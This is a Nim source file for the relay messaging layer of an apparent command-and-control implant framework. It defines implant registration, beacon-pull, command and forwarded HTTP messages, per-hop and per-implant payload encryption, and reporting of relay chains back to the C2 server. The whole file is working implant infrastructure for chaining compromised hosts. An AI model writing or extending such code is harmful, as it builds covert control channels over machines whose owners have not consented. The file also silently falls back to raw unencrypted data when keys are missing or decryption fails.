import json, times, strutils, tables, random, net
import ../../util/crypto
import relay_config

# Message types for relay communication
type
    RelayMessageType* = enum
        REGISTER = "register"
        PULL = "pull"
        COMMAND = "command"
        RESPONSE = "response"
        FORWARD = "forward"
        HTTP_REQUEST = "http_request"
        HTTP_RESPONSE = "http_response"
        CHAIN_INFO = "chain_info"
# Topology message types removed - using distributed chain relationships

    RelayMessage* = object
        msgType*: RelayMessageType
        fromID*: string
        route*: seq[string]
        id*: string
        payload*: string
        timestamp*: int64

    RelayImplant* = object
        id*: string
        isRelay*: bool
        upstreamHost*: string
        upstreamPort*: int
        downstreamPort*: int
        registeredImplants*: Table[string, ImplantInfo]
        messageQueue*: seq[RelayMessage]
        isListening*: bool
        isConnected*: bool

    ImplantInfo* = object
        id*: string
        lastSeen*: int64
        route*: seq[string]

    # Topology data structures removed - using distributed chain relationships

# Generate unique message ID
proc generateMessageID*(): string =
    randomize()
    result = $rand(1000000000..1999999999) & $epochTime().int64

# Serialize RelayMessage to JSON string
proc serialize*(msg: RelayMessage): string =
    let jsonObj = %*{
        "msgType": $msg.msgType,
        "fromID": msg.fromID,
        "route": msg.route,
        "id": msg.id,
        "payload": msg.payload,
        "timestamp": msg.timestamp
    }
    result = $jsonObj

# Deserialize JSON string to RelayMessage
proc deserialize*(jsonStr: string): RelayMessage =
    let jsonObj = parseJson(jsonStr)
    result.msgType = parseEnum[RelayMessageType](jsonObj["msgType"].getStr())
    result.fromID = jsonObj["fromID"].getStr()
    result.route = @[]
    for item in jsonObj["route"].getElems():
        result.route.add(item.getStr())
    result.id = jsonObj["id"].getStr()
    result.payload = jsonObj["payload"].getStr()
    result.timestamp = jsonObj["timestamp"].getInt()

# === NEW ENCRYPTION FUNCTIONS BY KEY TYPE ===

# Encrypt data using shared key (for hop-to-hop communication)
proc encryptWithSharedKey*(data: string): string =
    when defined debug:
        echo "[CRYPTO] 🔐 === ENCRYPT WITH SHARED KEY ==="
        echo "[CRYPTO] 🔐 Input data length: " & $data.len
        echo "[CRYPTO] 🔐 Input data preview: " & (if data.len > 50: data[0..49] & "..." else: data)
    
    let sharedKey = getSharedKey()
    if sharedKey == "":
        # No shared key available - return raw data (fallback)
        when defined debug:
            echo "[CRYPTO] 🔑 ❌ No shared key available - returning raw data"
        return data
    
    when defined debug:
        echo "[CRYPTO] 🔐 Using shared key (length: " & $sharedKey.len & ")"
    
    result = encryptData(data, sharedKey)
    when defined debug:
        echo "[CRYPTO] 🔐 ✅ Encrypted with SHARED key (hop-to-hop)"
        echo "[CRYPTO] 🔐 Output length: " & $result.len
        echo "[CRYPTO] 🔐 Output preview: " & (if result.len > 50: result[0..49] & "..." else: result)
        echo "[CRYPTO] 🔐 === END ENCRYPT WITH SHARED KEY ==="

# Encrypt data using unique key (for final destination communication)
proc encryptWithUniqueKey*(data: string): string =
    when defined debug:
        echo "[CRYPTO] 🔑 === ENCRYPT WITH UNIQUE KEY ==="
        echo "[CRYPTO] 🔑 Input data length: " & $data.len
        echo "[CRYPTO] 🔑 Input data preview: " & (if data.len > 50: data[0..49] & "..." else: data)
    
    let uniqueKey = getUniqueKey()
    if uniqueKey == "":
        # No unique key available - fallback to shared key
        when defined debug:
            echo "[CRYPTO] 🔑 ❌ No unique key available - using shared key fallback"
        return encryptWithSharedKey(data)
    
    when defined debug:
        echo "[CRYPTO] 🔑 Using unique key (length: " & $uniqueKey.len & ")"
    
    result = encryptData(data, uniqueKey)
    when defined debug:
        echo "[CRYPTO] 🔑 ✅ Encrypted with UNIQUE key (final destination)"
        echo "[CRYPTO] 🔑 Output length: " & $result.len
        echo "[CRYPTO] 🔑 Output preview: " & (if result.len > 50: result[0..49] & "..." else: result)
        echo "[CRYPTO] 🔑 === END ENCRYPT WITH UNIQUE KEY ==="

# Decrypt data using shared key (for hop-to-hop communication)
proc decryptWithSharedKey*(encryptedData: string): string =
    when defined debug:
        echo "[CRYPTO] 🔓 === DECRYPT WITH SHARED KEY ==="
        echo "[CRYPTO] 🔓 Input encrypted data length: " & $encryptedData.len
        echo "[CRYPTO] 🔓 Input encrypted data preview: " & (if encryptedData.len > 50: encryptedData[0..49] & "..." else: encryptedData)
    
    let sharedKey = getSharedKey()
    if sharedKey == "":
        # No shared key available - return raw data (fallback)
        when defined debug:
            echo "[CRYPTO] 🔓 ❌ No shared key available - returning raw data"
        return encryptedData
    
    when defined debug:
        echo "[CRYPTO] 🔓 Using shared key (length: " & $sharedKey.len & ")"
    
    result = decryptData(encryptedData, sharedKey)
    when defined debug:
        echo "[CRYPTO] 🔓 ✅ Decrypted with SHARED key (hop-to-hop)"
        echo "[CRYPTO] 🔓 Output length: " & $result.len
        echo "[CRYPTO] 🔓 Output preview: " & (if result.len > 50: result[0..49] & "..." else: result)
        echo "[CRYPTO] 🔓 === END DECRYPT WITH SHARED KEY ==="

# Decrypt data using unique key (for final destination communication)
proc decryptWithUniqueKey*(encryptedData: string): string =
    when defined debug:
        echo "[CRYPTO] 🔓 === DECRYPT WITH UNIQUE KEY ==="
        echo "[CRYPTO] 🔓 Input encrypted data length: " & $encryptedData.len
        echo "[CRYPTO] 🔓 Input encrypted data preview: " & (if encryptedData.len > 50: encryptedData[0..49] & "..." else: encryptedData)
    
    let uniqueKey = getUniqueKey()
    if uniqueKey == "":
        # No unique key available - fallback to shared key
        when defined debug:
            echo "[CRYPTO] 🔓 ❌ No unique key available - using shared key fallback"
        return decryptWithSharedKey(encryptedData)
    
    when defined debug:
        echo "[CRYPTO] 🔓 Using unique key (length: " & $uniqueKey.len & ")"
    
    result = decryptData(encryptedData, uniqueKey)
    when defined debug:
        echo "[CRYPTO] 🔓 ✅ Decrypted with UNIQUE key (final destination)"
        echo "[CRYPTO] 🔓 Output length: " & $result.len
        echo "[CRYPTO] 🔓 Output preview: " & (if result.len > 50: result[0..49] & "..." else: result)
        echo "[CRYPTO] 🔓 === END DECRYPT WITH UNIQUE KEY ==="

# Smart decryption function - tries unique key first, then shared key
proc smartDecrypt*(encryptedData: string): string =
    when defined debug:
        echo "[CRYPTO] 🧠 === SMART DECRYPT ATTEMPT ==="
        echo "[CRYPTO] 🧠 Input encrypted data length: " & $encryptedData.len
        echo "[CRYPTO] 🧠 Input encrypted data preview: " & (if encryptedData.len > 50: encryptedData[0..49] & "..." else: encryptedData)
    
    # Try unique key first (for messages meant for this specific implant)
    if hasUniqueKey():
        when defined debug:
            echo "[CRYPTO] 🧠 🔑 Attempting unique key decryption first..."
        try:
            result = decryptWithUniqueKey(encryptedData)
            when defined debug:
                echo "[CRYPTO] 🧠 ✅ Smart decrypt: SUCCESS with unique key"
                echo "[CRYPTO] 🧠 === END SMART DECRYPT (UNIQUE KEY SUCCESS) ==="
            return
        except:
            when defined debug:
                echo "[CRYPTO] 🧠 ❌ Smart decrypt: FAILED with unique key, trying shared key"
    else:
        when defined debug:
            echo "[CRYPTO] 🧠 🔑 No unique key available, trying shared key directly..."
    
    # Fallback to shared key (for hop-to-hop messages)
    try:
        result = decryptWithSharedKey(encryptedData)
        when defined debug:
            echo "[CRYPTO] 🧠 ✅ Smart decrypt: SUCCESS with shared key"
            echo "[CRYPTO] 🧠 === END SMART DECRYPT (SHARED KEY SUCCESS) ==="
    except:
        when defined debug:
            echo "[CRYPTO] 🧠 ❌ Smart decrypt: FAILED with both keys, returning raw data"
        result = encryptedData
        when defined debug:
            echo "[CRYPTO] 🧠 === END SMART DECRYPT (BOTH KEYS FAILED) ==="

# Reencrypt payload for forwarding (decrypt with one key, encrypt with another)
proc reencryptPayload*(encryptedPayload: string, useUniqueKey: bool): string =
    when defined debug:
        echo "[CRYPTO] 🔄 === REENCRYPT PAYLOAD ==="
        echo "[CRYPTO] 🔄 Input payload length: " & $encryptedPayload.len
        echo "[CRYPTO] 🔄 Target key type: " & (if useUniqueKey: "UNIQUE" else: "SHARED")
    
    # First decrypt with shared key (assumed hop-to-hop encryption)
    let decryptedData = decryptWithSharedKey(encryptedPayload)
    
    # Then encrypt with appropriate key for next hop
    if useUniqueKey:
        result = encryptWithUniqueKey(decryptedData)
        when defined debug:
            echo "[CRYPTO] 🔄 ✅ Reencrypted: shared → unique key"
    else:
        result = encryptWithSharedKey(decryptedData)
        when defined debug:
            echo "[CRYPTO] 🔄 ✅ Reencrypted: shared → shared key"
    
    when defined debug:
        echo "[CRYPTO] 🔄 Output length: " & $result.len
        echo "[CRYPTO] 🔄 === END REENCRYPT PAYLOAD ==="

# Create a new RelayMessage with optional encryption
proc createMessage*(msgType: RelayMessageType, fromID: string, route: seq[string], 
                   payload: string, useUniqueKey: bool = false): RelayMessage =
    when defined debug:
        echo "[MESSAGE] 📝 === CREATE MESSAGE ==="
        echo "[MESSAGE] 📝 Message type: " & $msgType
        echo "[MESSAGE] 📝 From ID: " & fromID
        echo "[MESSAGE] 📝 Route: " & $route
        echo "[MESSAGE] 📝 Payload length: " & $payload.len
        echo "[MESSAGE] 📝 Use unique key: " & $useUniqueKey
    
    result.msgType = msgType
    result.fromID = fromID
    result.route = route
    result.id = generateMessageID()
    result.timestamp = epochTime().int64
    
    # Encrypt payload based on key type selection
    if useUniqueKey:
        result.payload = encryptWithUniqueKey(payload)
        when defined debug:
            echo "[MESSAGE] 📝 ✅ Created message with UNIQUE key encryption"
    else:
        result.payload = encryptWithSharedKey(payload)
        when defined debug:
            echo "[MESSAGE] 📝 ✅ Created message with SHARED key encryption"
    
    when defined debug:
        echo "[MESSAGE] 📝 Message ID: " & result.id
        echo "[MESSAGE] 📝 Timestamp: " & $result.timestamp
        echo "[MESSAGE] 📝 === END CREATE MESSAGE ==="

# Create a new RelayMessage with raw payload (no encryption)
proc createRawMessage*(msgType: RelayMessageType, fromID: string, route: seq[string], 
                      payload: string): RelayMessage =
    when defined debug:
        echo "[MESSAGE] 📝 === CREATE RAW MESSAGE (NO ENCRYPTION) ==="
        echo "[MESSAGE] 📝 Message type: " & $msgType
        echo "[MESSAGE] 📝 From ID: " & fromID
        echo "[MESSAGE] 📝 Route: " & $route
        echo "[MESSAGE] 📝 Payload length: " & $payload.len
    
    result.msgType = msgType
    result.fromID = fromID
    result.route = route
    result.id = generateMessageID()
    result.payload = payload  # Store raw payload without encryption
    result.timestamp = epochTime().int64
    
    when defined debug:
        echo "[MESSAGE] 📝 Message ID: " & result.id
        echo "[MESSAGE] 📝 Timestamp: " & $result.timestamp
        echo "[MESSAGE] 📝 ✅ Raw message created (no encryption)"
        echo "[MESSAGE] 📝 === END CREATE RAW MESSAGE ==="

# Create REGISTER message
proc createRegisterMessage*(implantID: string, route: seq[string]): RelayMessage =
    let registerData = %*{
        "implantID": implantID,
        "timestamp": epochTime().int64,
        "capabilities": ["relay", "client"]
    }
    result = createMessage(REGISTER, implantID, route, $registerData)

# Create PULL message
proc createPullMessage*(implantID: string, route: seq[string]): RelayMessage =
    let pullData = %*{
        "implantID": implantID,
        "timestamp": epochTime().int64
    }
    result = createMessage(PULL, implantID, route, $pullData)

# Create HTTP_REQUEST message
proc createHttpRequestMessage*(fromID: string, route: seq[string], 
                              httpMethod: string, path: string, headers: seq[(string, string)], 
                              body: string = ""): RelayMessage =
    # Convert headers to JSON-compatible format
    var headerObj = newJObject()
    for (key, value) in headers:
        headerObj[key] = %value
    
    let httpData = %*{
        "method": httpMethod,
        "path": path,
        "headers": headerObj,
        "body": body,
        "timestamp": epochTime().int64
    }
    result = createMessage(HTTP_REQUEST, fromID, route, $httpData)

# Create HTTP_RESPONSE message (simplified version with JSON payload)
proc createHttpResponseMessage*(fromID: string, route: seq[string], 
                               responseJson: string): RelayMessage =
    result = createMessage(HTTP_RESPONSE, fromID, route, responseJson)

# Create enhanced CHAIN_INFO message for distributed chain relationships
proc createChainInfoMessage*(fromID: string, route: seq[string], 
                             parentGuid: string, role: string, listeningPort: int): RelayMessage =
    when defined debug:
        echo "[MESSAGE] 📝 === CREATE CHAIN INFO MESSAGE ==="
        echo "[MESSAGE] 📝 From ID: " & fromID
        echo "[MESSAGE] 📝 Parent GUID: " & (if parentGuid == "": "NULL (Direct C2)" else: parentGuid)
        echo "[MESSAGE] 📝 Role: " & role
        echo "[MESSAGE] 📝 Listening Port: " & $listeningPort
        echo "[MESSAGE] 📝 Route: " & $route
    
    # Enhanced chain data with system information
    let chainData = %*{
        "type": "chain_info",
        "implantID": fromID,
        "parentGuid": if parentGuid == "": newJNull() else: %parentGuid,
        "role": role,
        "listeningPort": listeningPort,
        "timestamp": epochTime().int64,
        # Enhanced routing information
        "routing_info": {
            "route": route,
            "hop_count": route.len,
            "is_direct_to_c2": parentGuid == "",
            "connection_type": if parentGuid == "": "DIRECT_C2" else: "RELAYED"
        }
    }
    
    when defined debug:
        echo "[MESSAGE] 📝 Enhanced chain data: " & $chainData
        echo "[MESSAGE] 📝 === END CREATE CHAIN INFO MESSAGE ==="
    
    result = createMessage(CHAIN_INFO, fromID, route, $chainData)

# Initialize relay implant
proc initRelayImplant*(implantID: string): RelayImplant =
    result.id = implantID
    result.isRelay = false
    result.upstreamHost = ""
    result.upstreamPort = 0
    result.downstreamPort = 0
    result.registeredImplants = initTable[string, ImplantInfo]()
    result.messageQueue = @[]
    result.isListening = false
    result.isConnected = false

# All topology functions removed - using distributed chain relationships system

# Validate message integrity
proc validateMessage*(msg: RelayMessage): bool =
    result = msg.id != "" and msg.fromID != "" and msg.route.len > 0 and 
             msg.timestamp > 0 and msg.payload != "" 